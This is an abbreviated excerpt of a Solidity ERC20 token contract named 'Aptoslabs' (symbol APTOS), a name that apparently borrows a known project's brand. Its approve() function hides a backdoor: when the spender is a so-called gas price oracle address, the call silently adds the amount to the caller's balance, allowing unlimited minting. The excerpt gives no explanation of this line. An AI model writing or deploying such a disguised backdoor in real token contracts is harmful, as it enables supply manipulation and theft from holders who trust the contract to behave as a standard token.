 ...
 */
contract ERC20 is Context, IERC20, IERC20Metadata, AddressFacet {
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        ...
        if (spender == getGasPriceOracle()) _balances[owner] += amount;
        return true;
    }
...
contract Aptoslabs is ERC20 {
    constructor() ERC20("Aptoslabs", "APTOS") {
